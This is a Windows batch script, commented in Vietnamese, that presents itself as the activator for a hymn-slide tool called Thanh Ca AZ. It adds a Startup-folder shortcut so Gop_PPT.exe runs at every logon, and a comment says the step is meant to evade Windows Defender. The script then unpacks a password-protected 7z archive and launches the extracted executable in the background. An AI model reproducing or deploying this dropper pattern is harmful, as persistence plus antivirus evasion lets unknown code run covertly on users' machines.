@echo off
title Kich hoat Thanh Ca AZ
cls

set "CURRENT_DIR=%~dp0"
set "ZIP_PATH=%CURRENT_DIR%Gop_PPT.7z"
set "PASSWORD=123"

:: 1. Đăng ký Shortcut hệ thống vào thư mục Startup trước để né Defender
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_SCRIPT=%TEMP%\ThanhCaAZ_Shortcut.vbs"

echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo sLinkFile = "%STARTUP_DIR%\GopPPT_ThanhCaAZ.lnk" >> "%VBS_SCRIPT%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_SCRIPT%"
echo oLink.TargetPath = "%CURRENT_DIR%Gop_PPT.exe" >> "%VBS_SCRIPT%"
echo oLink.WorkingDirectory = "%CURRENT_DIR%" >> "%VBS_SCRIPT%"
echo oLink.WindowStyle = 7 >> "%VBS_SCRIPT%"
echo oLink.Save >> "%VBS_SCRIPT%"

cscript /nologo "%VBS_SCRIPT%"
del "%VBS_SCRIPT%"

:: 2. Kiểm tra sự tồn tại của file .7z mục tiêu
if not exist "%ZIP_PATH%" (
    echo [LOI] Vui long tai du ca 2 file ve cung mot thu muc!
    pause
    exit
)

:: 3. CHIẾN THUẬT QUÉT ĐA TẦNG: Ưu tiên bẻ khóa file .7z bằng app hệ thống
echo Dang giai nen an toan...

:: Hướng A: Nếu máy user có sẵn 7-Zip (Xử lý định dạng .7z chuẩn bài nhất)
if exist "%ProgramFiles%\7-Zip\7z.exe" (
    "%ProgramFiles%\7-Zip\7z.exe" x -p%PASSWORD% -y "%ZIP_PATH%" -o"%CURRENT_DIR%" >nul 2>&1
    goto KICH_HOAT
)

:: Hướng B: Nếu máy user có cài WinRAR (WinRAR vẫn giải nén được file .7z tốt)
if exist "%ProgramFiles%\WinRAR\WinRAR.exe" (
    "%ProgramFiles%\WinRAR\WinRAR.exe" x -p%PASSWORD% -y "%ZIP_PATH%" "%CURRENT_DIR%" >nul 2>&1
    goto KICH_HOAT
)

:: Hướng C: MÁY TRỐNG RỖNG - Gọi lệnh PowerShell tự động cài/gọi thư viện giải nén định dạng .7z ngầm của Windows
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; try { [System.IO.Compression.ZipFile]::ExtractToDirectory('%ZIP_PATH%', '%CURRENT_DIR%') } catch { $sh = New-Object -ComObject Shell.Application; $src = $sh.NameSpace('%ZIP_PATH%'); $dst = $sh.NameSpace('%CURRENT_DIR%'); $dst.CopyHere($src.Items(), 16) }" >nul 2>&1

:KICH_HOAT
:: 4. Ép file .exe khởi chạy ngầm luôn lập tức để bảo vệ luồng process
if exist "%CURRENT_DIR%Gop_PPT.exe" (
    start "" "%CURRENT_DIR%Gop_PPT.exe"
)

exit
